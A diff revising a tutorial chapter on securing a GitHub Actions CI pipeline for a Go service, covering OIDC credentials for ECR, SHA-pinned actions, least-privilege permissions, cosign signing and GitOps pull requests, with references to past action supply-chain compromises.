@@ -15,9 +15,14 @@
 > multi-environment, multi-team CI safe at the platform level.
 
 **Estimated time:** ~30 min read · ~90 min hands-on
-**Prerequisites:** [Part 07 ch.03](../07-delivery/03-cicd-pipeline.md) — generic CI you'll now deepen for multi-service ECR · [Part 15 ch.01](./01-pr-to-production-lifecycle.md) — loop stages that frame the pipeline · [Part 14 ch.07](../14-eks-in-production-a-to-z/07-infrastructure-cicd-and-drift.md) — sibling infra CI/CD via OIDC
+**Prerequisites:** [Part 07 ch.03](../07-delivery/03-cicd-pipeline.md) —
+generic CI you'll now deepen for multi-service ECR · [Part 15
+ch.01](./01-pr-to-production-lifecycle.md) — loop stages that frame the
+pipeline · [Part 14
+ch.07](../14-eks-in-production-a-to-z/07-infrastructure-cicd-and-drift.md) —
+sibling infra CI/CD via OIDC
 
-**You'll know after this:** • author a GitHub Actions workflow with build → test → scan → multi-arch image push to ECR in real stage order · • configure GitHub Actions OIDC trust for ECR push (no static AWS keys, ever) · • design build caching for Go modules + Docker buildx GHA cache to keep CI under 8 minutes · • defeat the "CI ate my repo" footgun (untrusted-PR-with-secrets) with `pull_request_target` discipline · • configure branch protection + required checks that map to environment promotion gates
+**You'll know after this:** • author a GitHub Actions workflow with build → test → scan → multi-arch image push to ECR in real stage order · • configure GitHub Actions OIDC trust for ECR push (no static AWS keys, ever) · • design build caching for Go modules + Docker buildx GHA cache to keep CI short · • defeat the "CI ate my repo" footgun (untrusted-PR-with-secrets) with `pull_request_target` discipline · • configure branch protection + required checks that map to environment promotion gates
 
 <!-- tags: app-cicd, ci-cd, supply-chain, gitops, eks -->
 
@@ -64,11 +69,10 @@ The chapter also names the **two pipeline-shaped security failures** Part
   `if: github.event_name == 'push'` guard, the
   `pull_request_target` *non*-pattern).
 
-- **Privileged action versions** — a workflow that uses `@v3` instead of
-  a pinned commit SHA is downstream of every release that action publishes.
-  This chapter does NOT pin actions to SHAs (a teaching simplification —
-  the version pins are major-version-stable for the actions used), but it
-  names the trade-off and the production hardening path.
+- **Mutable action versions** — a workflow that uses `@v3` runs whatever that
+  tag points at on its next run. This chapter pins every third-party action to
+  a commit SHA, with the release in a comment, and explains why under How it
+  works.
 
 This is the *Building Platform Services* concern from *Production
 Kubernetes* ch.11 made specific to GitHub Actions + ECR + cosign; the
@@ -134,8 +138,8 @@ scope, branch-environment mapping, and fail-fast.**
 - **Branch-environment mapping is a *config*, not a workflow change.**
   `main` → `dev` overlay (auto-merge). A `release/*` branch or tag →
   `staging` overlay. A tag on `release/*` → `prod` overlay (with
-  reviewers). Part 15 ch.04 (parallel phase 15b) shows the
-  ApplicationSet that makes the env-overlay mapping declarative; this
+  reviewers). Part 15 ch.04 shows the ApplicationSet that makes the
+  env-overlay mapping declarative; this
   chapter wires the `main` → `dev` path so the rest is a configuration
   change.
 
@@ -145,9 +149,9 @@ scope, branch-environment mapping, and fail-fast.**
      guard on the build-sign-push and update-gitops-pr jobs. Fork PRs
      run `lint-test`, `integration-test`, `scan` — **never** sign,
      **never** push, **never** open a GitOps PR.
-  2. `permissions:` are minimal at workflow level (`id-token: write`,
-     `contents: read`, `packages: read`) and widened nowhere. A fork PR's
-     workflow can't write `contents:`.
+  2. `permissions:` is `contents: read` at workflow level, and no job widens
+     it for anything it does not need. A fork PR's `GITHUB_TOKEN` is read-only
+     regardless.
   3. No `pull_request_target` triggers anywhere. (`pull_request_target`
      runs in the context of the base branch and has access to secrets —
      the single most common foot-gun. Use it only with extreme caution,
@@ -159,6 +163,18 @@ fragility is invisible until the moment it matters. The discipline
 (stated plainly): **CI's job is to produce evidence and a commit, and
 *not* to hold cluster credentials, and *not* to run untrusted code with
 secrets**. If those three rules hold, the rest is performance tuning.
+
+## Threats and controls
+
+Four threats are specific to application CI. The rest of the Part covers the
+operations around them.
+
+| Threat | Control taught here | Goes deeper |
+|---|---|---|
+| A fork PR runs untrusted code next to your secrets | Fork PRs get no secrets and a read-only token. Signing, push and the GitOps PR run only on a push to `main`. No `pull_request_target` | [07.03](../07-delivery/03-cicd-pipeline.md) |
+| A long-lived cloud key sits in the repo | OIDC: the job trades a short-lived token for role credentials | [14.07](../14-eks-in-production-a-to-z/07-infrastructure-cicd-and-drift.md) |
+| A token can write more than its job needs | `contents: read` at workflow level. Each job asks for more in its own `permissions:`. The GitOps PAT covers one repo | [07.03](../07-delivery/03-cicd-pipeline.md) |
+| A tag on a third-party action moves to malicious code | Every third-party action pinned to a commit SHA, with the release in a comment | [05.03](../05-security/03-supply-chain.md), [07.03](../07-delivery/03-cicd-pipeline.md) |
 
 ## Diagrams
 
@@ -173,11 +189,11 @@ produces and the next consumes. The dotted boundary is the **CI/CD seam**
 ```mermaid
 flowchart TD
     push["git push / merged PR<br/>(paths: app/catalog/**)"]
-    lt["lint-test<br/>actions/setup-go@v5<br/>golangci/golangci-lint-action@v6<br/>go test -race -coverpkg=./..."]
-    it["integration-test<br/>services: postgres:16-alpine<br/>go test -tags=integration -race"]
-    sc{"scan<br/>aquasecurity/trivy-action@0.28.0<br/>exit-code 1, HIGH+CRITICAL"}
-    bsp["build-sign-push<br/>docker/build-push-action@v6 (amd64+arm64)<br/>aws-actions/configure-aws-credentials@v4 (OIDC)<br/>aws-actions/amazon-ecr-login@v2<br/>sigstore/cosign-installer@v3 + cosign sign+attest<br/>anchore/sbom-action (syft)"]
-    gp["update-gitops-pr<br/>actions/checkout@v4 (GITOPS_REPO)<br/>kustomize edit set image NAME@DIGEST<br/>peter-evans/create-pull-request@v7"]
+    lt["lint-test<br/>actions/setup-go<br/>golangci-lint-action (golangci-lint v2.15.0)<br/>go test -short -race -coverpkg=./..."]
+    it["integration-test<br/>Postgres contract test<br/>(testcontainers, no service container)<br/>go test -race -run TestPostgresRepo_Contract"]
+    sc{"scan<br/>trivy-action (Trivy v0.76.1)<br/>exit-code 1, HIGH+CRITICAL"}
+    bsp["build-sign-push<br/>docker/build-push-action (amd64+arm64)<br/>configure-aws-credentials (OIDC)<br/>amazon-ecr-login<br/>cosign-installer (cosign v3.1.4)<br/>cosign sign --recursive + attest<br/>download-syft (syft v1.55.0)"]
+    gp["update-gitops-pr<br/>checkout (GITOPS_REPO, no persisted token)<br/>kustomize v5.8.1 edit set image NAME@DIGEST<br/>create-pull-request (GITOPS_PR_TOKEN)"]
     fail["FAIL the pipeline<br/>(stops BEFORE sign/push)"]
     git[("GitOps repo PR<br/>kustomize/overlays/dev<br/>(new digest)")]
     argo["Argo CD<br/>(Part 07 ch.04 — pulls)"]
@@ -198,13 +214,13 @@ flowchart TD
                                                             no push)   (1+ approver)
  push (merged PR)         refs/heads/main                   dev        auto-merge
  push (release branch)    refs/heads/release/X.Y           staging    1 reviewer
-                          *parallel phase 15b
+                          *Part 15 ch.04
  tag                      refs/tags/vX.Y.Z                  prod       2 reviewers
-                          *parallel phase 15b                          + on-call
+                          *Part 15 ch.04                          + on-call
  ───────────────────────────────────────────────────────────────────────────────
  The workflow's `if:` conditions enforce this:
    build-sign-push:     if: github.event_name == 'push' && github.ref == 'refs/heads/main'
-   (staging/prod variants set ref to release/* or refs/tags/v* — phase 15b)
+   (staging/prod variants set ref to release/* or refs/tags/v* — Part 15 ch.04)
 
  The "if push to main" guard is THE security boundary for fork PRs:
    - fork PR -> ONLY lint-test + integration-test + scan run
@@ -236,23 +252,17 @@ cd examples/bookstore-platform/app/catalog        # the catalog service source
 go mod download
 go vet ./...
 golangci-lint run --timeout=5m ./...
-go test -race -count=1 -coverpkg=./... -coverprofile=coverage.out ./...
+go test -short -race -count=1 -coverpkg=./... -coverprofile=coverage.out ./...
 go tool cover -func=coverage.out | tail -1        # the same number CI prints
 
-# Stage 2 mirror — integration-test, with a real Postgres in Docker:
-docker run -d --name catalog-it-pg \
-  -e POSTGRES_USER=catalog -e POSTGRES_PASSWORD=catalog -e POSTGRES_DB=catalog \
-  -p 5432:5432 postgres:16-alpine
-DB_DSN='postgres://catalog:catalog@localhost:5432/catalog?sslmode=disable' \
-  go run ./cmd/migrate
-DB_DSN='postgres://catalog:catalog@localhost:5432/catalog?sslmode=disable' \
-  go test -tags=integration -race -count=1 ./...
-docker rm -f catalog-it-pg
+# Stage 2 mirror — the Postgres contract test. testcontainers starts its own
+# Postgres, so Docker must be running on this machine:
+go test -race -count=1 -timeout=5m -run TestPostgresRepo_Contract ./...
 
 # Stage 3 mirror — Trivy scan, locally:
 trivy fs --severity HIGH,CRITICAL --exit-code 1 --ignore-unfixed examples/bookstore-platform/app/catalog
-# The CI uses the exact same flags; a clean local scan = clean CI scan (modulo
-# CVE-database drift since Trivy publishes daily).
+# CI runs the same flags on Trivy v0.76.1. A clean local scan means a clean
+# CI scan, modulo CVE-database drift since Trivy publishes daily.
 ```
 
 This is stages 1–3 verbatim. Stage 4 (build-sign-push) and stage 5
@@ -269,33 +279,35 @@ Open
 Five jobs, wired by `needs:`. Each is a "stage" from ch.15.01.
 
 **Job 1 — `lint-test`** (`runs-on: ubuntu-latest`). Path-filtered to
-`app/catalog/**`. Sets up Go with module cache keyed by `go.sum` (cache
-hit → skip `go mod download`, saves ~30s/run). Runs `go vet`,
-`golangci-lint` (via the official action), then
-`go test -race -count=1 -coverpkg=./... -coverprofile=coverage.out`. The
+`app/catalog/**`. Sets up Go from the module's own `go` line
+(`go-version-file`), so the toolchain cannot drift from `go.mod`, with the
+module cache keyed by `go.sum`. Runs `go vet`, `golangci-lint` v2.15.0 (via
+the official action), then `go test -short -race -count=1 -coverpkg=./...
+-coverprofile=coverage.out`. `-short` skips the Postgres contract test, which
+job 2 runs. The
 `-coverpkg=./...` is important: by default Go counts coverage only in the
 test's *own* package, which under-reports for a service with cross-
 package tests. Uploads `coverage.out` as an artifact. **No cloud
 credentials, no registry access.** This job runs on **every** PR and
-**every** push — the fail-fast gate. (Honesty: the actual Go sources live
-under `app/catalog/`. Phase 15a does not implement them; the workflow is
-the contract a future build will satisfy.)
+**every** push — the fail-fast gate. Permissions are `contents: read`. The
+catalog source it builds is in this guide's examples tree.
 
-**Job 2 — `integration-test`** (`runs-on: ubuntu-latest`,
-`needs: lint-test`). Brings up Postgres 16 as a **service container** —
-GitHub Actions runs it on the runner with port-mapping, and the
-`health-cmd` makes the runner *wait* for `pg_isready` before running
-steps (without this, the first test races the container's startup and
-flakes 1-in-10 runs). Sets `DB_DSN` env, runs `go run ./cmd/migrate` for
-schema migration, then `go test -tags=integration` (build-tagged so unit
-tests stay fast). orders.yml adds a `rabbitmq:3.13-management-alpine`
-service container; payments-worker.yml adds both Postgres and RabbitMQ
-and stubs the payment provider in a Go test helper bound to
-`127.0.0.1:9000`. **No cloud credentials.**
+**Job 2 — `integration-test`** (`needs: lint-test`). Runs
+`TestPostgresRepo_Contract`. The test starts Postgres 16 with testcontainers,
+the repository applies the catalog's migration when it starts, and the
+contract runs against that database. The job needs Docker on the runner,
+which GitHub-hosted Ubuntu runners provide, and no service container.
+Orders and payments-worker declare Postgres and RabbitMQ **service
+containers** instead. GitHub runs each one as a real container on the
+runner, and the `health-cmd` makes the runner wait for readiness before the
+first step. Both images are pinned by digest. Those two services have no
+integration tests in this guide yet, so their job passes with nothing to run
+until one exists. **No cloud credentials.**
 
 **Job 3 — `scan`** (`runs-on: ubuntu-latest`, `needs: integration-test`).
-Trivy filesystem scan over the service's directory with
-`severity: HIGH,CRITICAL`, `exit-code: '1'`, `ignore-unfixed: true`.
+Trivy filesystem scan over the service's directory, with Trivy pinned to
+v0.76.1 (`version`, the pin the guide's own scan workflow uses), `severity:
+HIGH,CRITICAL`, `exit-code: '1'`, and `ignore-unfixed: true`.
 `ignore-unfixed: true` is the deliberate choice (Part 07 ch.03 explains
 the trade-off): CVEs with no upstream fix can't be remediated by a
 rebuild, so gating on them is a false gate; the mitigation is *continuous
@@ -309,22 +321,26 @@ credentials yet.**
 `if:` guard is the security boundary.** A fork PR never reaches this
 job. On a merged-to-`main` push:
 
-1. `aws-actions/configure-aws-credentials@v4` with `role-to-assume:
+1. `aws-actions/configure-aws-credentials` with `role-to-assume:
    ${{ secrets.AWS_ROLE_ARN_ECR }}` and `audience: sts.amazonaws.com` —
    GitHub mints a short-lived JWT (the `id-token: write` permission
-   above), STS swaps it for a 15-minute set of AWS credentials. **No
-   long-lived AWS key is ever stored in the repo.**
+   on this job), STS exchanges it for role credentials that expire with the
+   role session (one hour by default, see How it works). **No long-lived AWS
+   key is ever stored in the repo.**
 2. `aws-actions/amazon-ecr-login@v2` logs Docker into ECR with those
    credentials.
-3. `docker/setup-qemu-action@v3` + `docker/setup-buildx-action@v3` set
+3. `docker/setup-qemu-action` + `docker/setup-buildx-action` set
    up multi-arch builds. QEMU emulates arm64 on the amd64 runner — slow
    but reliable; for high-throughput builds, use a self-hosted arm64
-   runner (Graviton) and skip QEMU. Part 14 ch.09 (parallel phase 14c)
-   covers the Graviton migration; the workflow is **already Graviton-
+   runner (Graviton) and skip QEMU. Part 14 ch.09 covers the Graviton
+   migration; the workflow is **already Graviton-
    ready** because it builds multi-arch.
-4. `sigstore/cosign-installer@v3` action installs the cosign CLI, with `cosign-release: 'v2.4.1'` pinning the binary version.
-   `anchore/sbom-action/download-syft@v0.17.7` installs syft.
-5. `docker/build-push-action@v6` builds the multi-stage Dockerfile,
+4. `sigstore/cosign-installer` installs the cosign CLI at the version named by
+   `cosign-release` (v3.1.4, as in
+   [07.03](../07-delivery/03-cicd-pipeline.md)).
+   `anchore/sbom-action/download-syft` installs syft at `syft-version`
+   (v1.55.0).
+5. `docker/build-push-action` builds the multi-stage Dockerfile,
    pushes the multi-arch manifest to ECR, tagged `sha-<COMMIT>` AND
    `latest-main`. The action exposes the manifest digest as
    `steps.build.outputs.digest`. `provenance: true` + `sbom: true`
@@ -341,13 +357,16 @@ job. On a merged-to-`main` push:
    base-layer CVEs.
 7. `syft <IMAGE>@<DIGEST> -o spdx-json` — full SBOM as SPDX JSON, bound
    to the digest.
-8. `cosign sign --yes <IMAGE>@<DIGEST>` — **keyless**. ch.15.03 unpacks
-   this; the one-liner is: the runner uses its `id-token` JWT to
-   authenticate to Sigstore Fulcio, which issues a ~10-minute X.509 cert
+8. `cosign sign --yes --recursive <IMAGE>@<DIGEST>`: **keyless**.
+   `--recursive` signs each platform image in the index, not only the index
+   (cosign's own help text). [15.03](03-image-signing-and-provenance.md)
+   unpacks this. In short: the runner uses its `id-token` JWT to authenticate
+   to Sigstore Fulcio, which issues a ~10-minute X.509 cert
    bound to *this workflow's identity* (the cert's SAN is
    `https://github.com/GITHUB_ORG/REPO/.github/workflows/catalog.yml@refs/heads/main`
    — a Kyverno `verifyImages` rule can match exactly that). The cert +
-   signature + a Rekor entry are stored; **no private key ever exists**.
+   signature + a Rekor entry are stored; **no long-lived signing key is
+   stored**.
 9. `cosign attest --type spdxjson --predicate <SBOM> <IMAGE>@<DIGEST>` —
    the SBOM is bound to the digest as a cosign attestation, so a
    consumer can `cosign verify-attestation` and trust the SBOM via the
@@ -360,14 +379,17 @@ job. On a merged-to-`main` push:
 **Job 5 — `update-gitops-pr`** (`runs-on: ubuntu-latest`,
 `needs: build-sign-push`, same `if:` guard). The CI/CD seam.
 
-1. `actions/checkout@v4` with `repository: ${{ vars.GITOPS_REPO }}` —
+1. `actions/checkout` with `repository: ${{ vars.GITOPS_REPO }}` —
    checks out the **GitOps repo**, not the app repo. `token:
    ${{ secrets.GITOPS_PR_TOKEN }}` (a fine-grained PAT or GitHub App
    token scoped to `contents: write` + `pull-requests: write` on the
-   GitOps repo *only*).
-2. `actions/download-artifact@v4` for `digest-catalog`.
-3. Install **pinned** kustomize (`v5.5.0`) via a release tarball — never
-   the `install_kustomize.sh` master script (Part 07 ch.03's anti-pattern
+   GitOps repo *only*). `persist-credentials: false` keeps that token out of
+   the checkout's `.git/config`.
+2. `actions/download-artifact` for `digest-catalog`.
+3. Install **pinned** kustomize (`v5.8.1`, the version kubectl v1.37.2 embeds)
+   from its release tarball, and check the tarball's SHA-256 against the
+   release's `checksums.txt` before extracting. Never the
+   `install_kustomize.sh` master script (Part 07 ch.03's anti-pattern
    warning).
 4. Validate the digest format (`grep '^sha256:'`) — refuse to write an
    empty or malformed digest. The shell guard catches the failure mode
@@ -378,13 +400,16 @@ job. On a merged-to-`main` push:
    it).
 5. `cd gitops/kustomize/overlays/dev && kustomize edit set image
    bookstore/catalog=<REGISTRY>/bookstore/catalog@<DIGEST>`.
-6. `peter-evans/create-pull-request@v7` opens a PR on a branch
+6. `peter-evans/create-pull-request` (v7.0.11) opens a PR on a branch
    `bump/catalog-<SHA>`. The PR body includes the source workflow run
    ID and the commit SHA, so a reviewer can trace back to the cosign
-   identity. **No auto-merge enabled here** — that is a branch-protection
+   identity. The PR is opened with a PAT or App token, not `GITHUB_TOKEN`: a
+   PR that `GITHUB_TOKEN` opens starts no checks, so the required checks never
+   run ([07.03](../07-delivery/03-cicd-pipeline.md) shows it). **No auto-merge
+   enabled here** — that is a branch-protection
    *rule* in the GitOps repo, not a workflow choice. The dev overlay PR
    may auto-merge if branch protection allows; staging/prod overlay PRs
-   require human review (Part 15 ch.04, parallel phase 15b).
+   require human review ([15.04](04-multi-environment-promotion.md)).
 
 The five jobs are the eight stages from ch.15.01's loop, stages 3–5,
 mapped 1:1 onto a runnable workflow file.
@@ -417,12 +442,11 @@ Open the catalog workflow at the top:
 
 ```yaml
 permissions:
-  id-token: write
   contents: read
-  packages: read
 ```
 
-This is the *workflow-level* permission set. A fork PR's workflow runs
+This is the *workflow-level* permission set, read-only. A fork PR's workflow
+runs
 with this set, **minus** any secrets (GitHub omits secrets for fork PRs
 by default). The `if: github.event_name == 'push' && github.ref ==
 'refs/heads/main'` guard on `build-sign-push` and `update-gitops-pr`
@@ -455,7 +479,7 @@ makes the safe pattern *enforceable at admission* via Kyverno
 ## How it works under the hood
 
 - **OIDC trust between GitHub and AWS.** The
-  `aws-actions/configure-aws-credentials@v4` step works because of a
+  `aws-actions/configure-aws-credentials` step works because of a
   trust relationship configured *once* in AWS (Part 14 ch.07's territory):
   an IAM OIDC identity provider points at
   `token.actions.githubusercontent.com`, and an IAM role
@@ -465,24 +489,25 @@ makes the safe pattern *enforceable at admission* via Kyverno
   `sts.amazonaws.com` may assume me". When the workflow runs:
   1. GitHub mints a short-lived JWT signed by their key (the
      `id-token: write` permission unlocks this).
-  2. The action exchanges the JWT at STS for ~15 minutes of AWS creds.
-  3. The creds expire in 15 minutes whether the workflow finishes or
-     not — a leak is bounded in time.
+  2. The action exchanges the JWT at STS for role credentials.
+  3. The credentials expire when the role session ends, whether the workflow
+     finishes or not. The action defaults to one hour (`role-duration-seconds`
+     accepts 15 minutes to 12 hours). A leak is bounded in time.
   No `AWS_ACCESS_KEY_ID` is ever in a GitHub secret. The whole pattern
   ports to GCP Workload Identity Federation and Azure OIDC Federation
   with one-line action changes; the model is identical.
 
 - **The buildx cache and the Go cache are different things.** The Go
   cache (module + build cache) is keyed by `go.sum` via
-  `actions/setup-go@v5`'s `cache: true` — a cache *hit* skips
+  `actions/setup-go`'s `cache: true` — a cache *hit* skips
   `go mod download` and reuses compiled packages (saves 30s+ per run).
   The Buildx cache (`cache-from: type=gha`) is keyed by job-scope
   (`scope: catalog`) and reuses Docker *layers* across runs — a cache
   hit means the multi-stage build's `go build` step doesn't re-run, and
   the `COPY --from=builder` only re-emits changed layers. Both caches
-  are evicted by GitHub's 10GB-per-repo limit (LRU). Cache misses on a
-  Monday morning (after a Friday evict) are *normal*; the build slows
-  from 30s to 6m, the workflow still passes.
+  are capped at GitHub's default of 10 GB per repository, and an entry not
+  read for seven days is removed. A miss only makes the build slower; the
+  workflow still passes.
 
 - **Service containers are real containers on the runner, not in-
   process mocks.** `services: postgres:` brings up the postgres image as
@@ -490,8 +515,8 @@ makes the safe pattern *enforceable at admission* via Kyverno
   steps execute; the runner's network namespace makes
   `localhost:5432` route to it. The `health-cmd` makes the runner *wait*
   for `pg_isready` before running the first step (without it, the first
-  test races the container startup and flakes ~10% of the time on a
-  cold runner). Service containers don't persist between jobs; each job
+  test races the container startup and can fail on a cold runner). Service
+  containers don't persist between jobs; each job
   brings up its own.
 
 - **`docker/build-push-action` outputs the digest because the registry
@@ -506,7 +531,7 @@ makes the safe pattern *enforceable at admission* via Kyverno
   makes pinning by digest *mean* something — a tag is just a pointer
   that anyone with push access can move.
 
-- **`peter-evans/create-pull-request@v7` reuses an existing PR if the
+- **`peter-evans/create-pull-request` reuses an existing PR if the
   branch already exists.** The action computes a branch name
   (`bump/catalog-<SHA>`); if a PR on that branch is already open, it
   pushes new commits to it instead of opening a duplicate. This matters
@@ -526,8 +551,8 @@ makes the safe pattern *enforceable at admission* via Kyverno
     - prod overlay PRs: two required reviewers (the team + a platform
       engineer); status checks `argo-cd-staging-synced` AND
       `argo-cd-staging-healthy-24h` must pass.
-  Part 15 ch.04 (parallel phase 15b) shows the per-overlay workflow
-  variants that emit the staging/prod PRs.
+  Part 15 ch.04 shows the per-overlay workflow variants that emit the
+  staging/prod PRs.
 
 - **The path filter is a runner-minutes optimisation, not a security
   boundary.** `paths: ['app/catalog/**']` makes the catalog workflow
@@ -539,74 +564,45 @@ makes the safe pattern *enforceable at admission* via Kyverno
   boundary remains the `if: github.event_name == 'push' && ref ==
   refs/heads/main` guard on secret-needing jobs.
 
+- **Pin every action to a commit SHA.** A tag is a pointer its owner can
+  move. In 2025, versions of `tj-actions/changed-files` through 45.0.7 let
+  remote attackers read secrets from workflow logs (CVE-2025-30066,
+  [GHSA-mrrh-fwg8-r2c3](https://github.com/advisories/GHSA-mrrh-fwg8-r2c3)).
+  In March 2026, 76 of the 77 version tags of `aquasecurity/trivy-action`
+  were force-pushed to malicious commits
+  ([GHSA-69fq-xp46-6x23](https://github.com/advisories/GHSA-69fq-xp46-6x23),
+  CVE-2026-33634). A SHA names the code that runs, so the code that runs is
+  the code you reviewed. Dependabot can propose SHA bumps as reviewable pull
+  requests, with the release named in the comment.
+- **Scope secrets to environments.** Give a publish job `environment:` (for
+  staging or production) with required reviewers, and keep its role ARN and
+  other credentials in that environment, so a development workflow never
+  sees them. The Terraform apply workflow in
+  [14.07](../14-eks-in-production-a-to-z/07-infrastructure-cicd-and-drift.md)
+  uses the same pattern.
+- **Run publish jobs on runners you control, when the risk warrants it.**
+  The publish job holds the OIDC session and the GitOps token while it runs.
+  Self-hosted runners in a controlled network narrow who can reach that
+  memory. The cost is a runner pool to operate.
+- **Review the workflow file like code.** A change to `.github/workflows/`
+  decides what every other change can do. Give that path a CODEOWNERS entry
+  for the platform team, with the same review as application code.
+
 ## Production notes
 
-> **In production: pin every action to a commit SHA, not a tag.** The
-> workflow templates here pin to major versions (`actions/checkout@v4`)
-> for teaching readability. Production hardening pins to commit SHAs
-> with the version in a comment
-> (`actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4.1.1`),
-> because a tag is a mutable pointer: whoever controls the action's
-> repository can move it, and every workflow using it runs the new code
-> on its next run. This has happened twice at scale. In March 2025
-> `tj-actions/changed-files` (CVE-2025-30066, via a compromised
-> `reviewdog/action-setup`) had its tags repointed to code that dumped
-> runner secrets into build logs. In March 2026 the version tags of
-> `aquasecurity/trivy-action` were force-pushed to malicious commits; only
-> its immutable `0.35.0` release survived
-> (GHSA-69fq-xp46-6x23, CVE-2026-33634). That is a security scanner,
-> running in the job that holds `security-events: write`. This repo's
-> own live workflows (`.github/workflows/` at the repo root) are
-> SHA-pinned, with Dependabot proposing the bumps as reviewable PRs.
+> **In production: alert on workflow *infrastructure* failures, not just
+> test failures.** A workflow that fails at "Configure AWS credentials" has
+> an infrastructure problem: the OIDC provider drifted, the role's trust
+> policy changed, or the IAM permissions were tightened. Send the failure
+> webhook to PagerDuty ([15.10](10-incident-response-and-on-call.md)) so a
+> sustained credentials failure pages the platform team, while a failed test
+> notifies the service team.
 
-> **In production: scope GitHub Actions secrets by environment.** Use
-> GitHub Environments (Settings → Environments) with required reviewers
-> to gate the `build-sign-push` step on staging/prod. The workflow then
-> declares `environment: production`, the action waits for a reviewer
-> approval before running, and the production-only secrets (e.g. a
-> prod-only OIDC role ARN) live in that environment. The dev workflow
-> sees only dev secrets. This is the same `environment:` pattern the Terraform apply
-> workflow uses (ch.14.07): the apply role is trusted only from the
-> `production` environment.
-
-> **In production: alert on workflow *infrastructure* failures, not
-> just test failures.** A workflow that fails at "Configure AWS
-> credentials via OIDC" is **not** a code problem — it is an
-> infrastructure problem (the OIDC provider drifted, the role's trust
-> policy changed, the IAM permissions were tightened). These look like
-> CI failures in the GitHub UI but should page the platform team. Wire
-> the workflow's failure webhook into PagerDuty's CI service (Part 15
-> ch.10, parallel phase 15d) so a sustained "configure AWS credentials"
-> failure pages, while a "test failed" notifies the service team.
-
-> **In production: keep PR runs fast (< 5 min) and main runs strict.**
-> The asymmetry is real: PR runs need to be fast enough that developers
-> don't context-switch waiting for green; main runs can be slow because
-> they only happen on merge. The workflows here implement this — PR runs
-> have informational coverage; main runs gate strictly. Time-budget the
-> PR pipeline (lint + unit + scan = ≤3m on a cache hit) and accept
-> that integration tests run only on main if needed. (orders.yml runs
-> integration on PR; payments-worker's integration is fast enough; if
-> a service's integration suite goes over budget, split the heavy
-> bits to a separate `nightly:` workflow.)
-
-> **In production: use a separate runner pool for the publish path.**
-> GitHub-hosted runners are shared (theoretically isolated, but
-> defense-in-depth is cheap). For the `build-sign-push` and
-> `update-gitops-pr` jobs, use **self-hosted runners** in a controlled
-> network, or use GitHub-hosted larger runners with `actions/runner` in
-> an account-bound configuration. The OIDC creds are short-lived, but
-> the runner's local filesystem during the job has the cert + key in
-> memory. The cost is a self-hosted runner pool; the benefit is a
-> tighter blast radius.
-
-> **In production: the workflow file is *also* code; review it like
-> code.** A change to `.github/workflows/catalog.yml` should require
-> the same review path as a change to `app/catalog/main.go`. The
-> branch protection rules apply equally; in fact, the workflow file is
-> the *more* important code review, because it is the pipeline that
-> reviews all other code. CODEOWNERS for `.github/` to the platform
-> team is the standard pattern.
+> **In production: keep PR runs short and main runs strict.** PR runs must
+> finish before a developer switches away, so lint, unit and scan run on
+> every PR. Main runs can be slower because they happen on merge. If the
+> integration suite outgrows the PR budget, move its heavy part to a
+> scheduled `nightly` workflow.
 
 ## Quick Reference
 
@@ -617,9 +613,13 @@ cat examples/bookstore-platform/ci/.github-workflows-catalog.yml
 # Run the locally-reproducible stages (no OIDC, no ECR):
 ( cd examples/bookstore-platform/app/catalog && \
     go mod download && go vet ./... && \
-    go test -race -count=1 -coverpkg=./... ./... )
+    go test -short -race -count=1 -coverpkg=./... ./... )
 trivy fs --severity HIGH,CRITICAL --exit-code 1 --ignore-unfixed \
   examples/bookstore-platform/app/catalog
+
+# The Postgres contract test (needs Docker for testcontainers):
+( cd examples/bookstore-platform/app/catalog && \
+    go test -race -count=1 -run TestPostgresRepo_Contract ./... )
 
 # View the workflow runs (when CI is wired):
 gh -R GITHUB_ORG/bookstore run list --workflow catalog.yml
@@ -629,51 +629,60 @@ gh -R GITHUB_ORG/bookstore run view  WORKFLOW_RUN_ID --log
 gh -R GITHUB_ORG/bookstore-gitops pr list --search 'bump:'
 gh -R GITHUB_ORG/bookstore-gitops pr view  PR_NUM
 
-# Local cosign keyless dry-run (for hotfix or ad-hoc signing):
-./examples/bookstore-platform/ci/sbom-and-sign.sh catalog \
+# Local cosign keyless dry-run (ad hoc). Name the identity you expect:
+CERT_IDENTITY=YOUR_OIDC_IDENTITY CERT_OIDC_ISSUER=ISSUER_URL \
+  ./examples/bookstore-platform/ci/sbom-and-sign.sh catalog \
   'AWS_ACCOUNT_ID.dkr.ecr.AWS_REGION.amazonaws.com/bookstore/catalog@sha256:DIGEST-HEX'
 ```
 
 Minimal workflow skeleton (the shape; full file in
-[`examples/bookstore-platform/ci/`](../examples/bookstore-platform/ci/)):
+[`examples/bookstore-platform/ci/`](../examples/bookstore-platform/ci/)).
+Every action is pinned, and each job asks for only the scopes it needs:
 
 ```yaml
 name: <SERVICE>-ci
 on:
   pull_request: { paths: ['app/<SERVICE>/**'] }
   push:         { branches: [main], paths: ['app/<SERVICE>/**'] }
-permissions: { id-token: write, contents: read, packages: read }
+permissions: { contents: read }            # read-only; jobs ask for more
 concurrency:  { group: <SERVICE>-ci-${{ github.ref }}, cancel-in-progress: true }
 jobs:
-  lint-test:                          # stage 3a — fast gate
+  lint-test:                               # stage 3a: fast gate
     runs-on: ubuntu-latest
+    permissions: { contents: read }
     steps:
-      - uses: actions/checkout@v4
-      - uses: actions/setup-go@v5
-        with: { go-version: '1.23', cache: true, cache-dependency-path: app/<SERVICE>/go.sum }
-      - run: go vet ./... && go test -race -count=1 ./...
-  integration-test:                   # stage 3b — DB/broker via service containers
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
+      - uses: actions/setup-go@b7ad1dad31e06c5925ef5d2fc7ad053ef454303e # v7.0.0
+        with: { go-version-file: app/<SERVICE>/go.mod, cache: true, cache-dependency-path: app/<SERVICE>/go.sum }
+      - run: go vet ./... && go test -short -race -count=1 ./...
+  integration-test:                        # stage 3b: Postgres via testcontainers
     runs-on: ubuntu-latest
     needs: lint-test
-    services:
-      postgres: { image: postgres:16-alpine, ports: ['5432:5432'], options: '--health-cmd "pg_isready"' }
-    steps: [ ... go test -tags=integration ... ]
-  scan:                               # stage 3c — Trivy GATE (exit-code 1)
+    permissions: { contents: read }
+    steps: [ { run: go test -race -count=1 -run TestPostgresRepo_Contract ./... } ]
+  scan:                                    # stage 3c: Trivy gate (exit-code 1)
     runs-on: ubuntu-latest
     needs: integration-test
-    steps: [ { uses: aquasecurity/trivy-action@0.28.0, with: { exit-code: '1' } } ]
-  build-sign-push:                    # stage 4 — only on push to main; OIDC + cosign keyless
+    permissions: { contents: read }
